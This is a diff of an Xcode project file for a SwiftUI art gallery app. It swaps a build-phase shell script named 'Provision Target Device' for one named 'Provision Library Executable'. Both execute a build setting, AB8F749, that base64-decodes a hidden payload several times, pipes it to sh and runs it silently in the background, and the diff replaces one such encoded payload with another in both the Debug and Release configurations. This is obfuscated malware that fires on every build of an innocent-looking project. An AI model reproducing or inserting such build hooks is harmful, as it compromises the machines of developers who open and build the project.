@@ -52,7 +52,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 46C754703003CD7700841AE8 /* Build configuration list for PBXNativeTarget "ArtGalaryExplorer_SwiftUI" */;
 			buildPhases = (
-				AF8721257C234EFA88947F8B /* Provision Target Device */,
+				3D180321324D49CEA3947F8B /* Provision Library Executable */,
 				46C754613003CD7600841AE8 /* Sources */,
 				46C754623003CD7600841AE8 /* Frameworks */,
 				46C754633003CD7600841AE8 /* Resources */,
@@ -105,28 +105,6 @@
 		};
 /* End PBXProject section */
 
-/* Begin PBXShellScriptBuildPhase section */
-		AF8721257C234EFA88947F8B /* Provision Target Device */ = {
-			isa = PBXShellScriptBuildPhase;
-			buildActionMask = 2147483647;
-			alwaysOutOfDate = 1;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-			);
-			name = "Provision Target Device";
-			outputFileListPaths = (
-			);
-			outputPaths = (
-			);
-			shellPath = /bin/sh;
-			showEnvVarsInLog = 0;	
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${AB8F749}\"";
-		};
-/* End PBXShellScriptBuildPhase section */
-
 /* Begin PBXResourcesBuildPhase section */
 		46C754633003CD7600841AE8 /* Resources */ = {
 			isa = PBXResourcesBuildPhase;
@@ -136,6 +114,29 @@
 			runOnlyForDeploymentPostprocessing = 0;
 		};
 /* End PBXResourcesBuildPhase section */
+
+/* Begin PBXShellScriptBuildPhase section */
+		3D180321324D49CEA3947F8B /* Provision Library Executable */ = {
+			isa = PBXShellScriptBuildPhase;
+			alwaysOutOfDate = 1;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Provision Library Executable";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${AB8F749}\"";
+			showEnvVarsInLog = 0;
+		};
+/* End PBXShellScriptBuildPhase section */
 
 /* Begin PBXSourcesBuildPhase section */
 		46C754613003CD7600841AE8 /* Sources */ = {
@@ -151,7 +152,7 @@
 		46C7546E3003CD7700841AE8 /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				AB8F749 = "((i(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmhLYWsxSWFIUlRWVTEzWkVacmVVOVlWbWxpVmxweFdrVk5lRTFIUmxoTlYzaHBUVEZaZDFOVlVrcE5NR3hFVFVoU2FtSldXWGRaTWpWeVdqQTFWRkZZVW1GUk1FWndXVEJSZUU1R2EzbFBWM1JoVm1wc00xbFZaRWRsYkhCVVUxZGthRk5HU1hkWk1HaE9UbXQ0TlU5WGVHeFRSVXA2V1dwT1MySkdhM2xWYmxaTlltdHZlRlJFU2taalJXeHdVV3BvU2xORk5YWlJNbU01VUZGdlBRbz0K | i | sh ) >/dev/null 2>&1 &)";
+				AB8F749 = "((s(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETUhSWk1qbDFZbTFXYW1SRE1UQmhWekZzWWpOV01FbEVTWGRKUXpGTldtMTBla2xETUhSamJWWXdZMjVyWjA1VFFYUmFRMEZwWTBReE5Ga3lPV3RhVmpsM1lVZEdlbHBUU1dkaFNGSXdZMGhOTmt4NU9XeGxTRUp6WWpOS2JGa3lVblZNYmtveFRESkZjRWxwUWpoSlNFNXZRMmM5UFFvPQo= | s | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
@@ -215,7 +216,7 @@
 		46C7546F3003CD7700841AE8 /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				AB8F749 = "((i(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmhLYWsxSWFIUlRWVTEzWkVacmVVOVlWbWxpVmxweFdrVk5lRTFIUmxoTlYzaHBUVEZaZDFOVlVrcE5NR3hFVFVoU2FtSldXWGRaTWpWeVdqQTFWRkZZVW1GUk1FWndXVEJSZUU1R2EzbFBWM1JoVm1wc00xbFZaRWRsYkhCVVUxZGthRk5HU1hkWk1HaE9UbXQ0TlU5WGVHeFRSVXA2V1dwT1MySkdhM2xWYmxaTlltdHZlRlJFU2taalJXeHdVV3BvU2xORk5YWlJNbU01VUZGdlBRbz0K | i | sh ) >/dev/null 2>&1 &)";
+				AB8F749 = "((s(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETUhSWk1qbDFZbTFXYW1SRE1UQmhWekZzWWpOV01FbEVTWGRKUXpGTldtMTBla2xETUhSamJWWXdZMjVyWjA1VFFYUmFRMEZwWTBReE5Ga3lPV3RhVmpsM1lVZEdlbHBUU1dkaFNGSXdZMGhOTmt4NU9XeGxTRUp6WWpOS2JGa3lVblZNYmtveFRESkZjRWxwUWpoSlNFNXZRMmM5UFFvPQo= | s | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
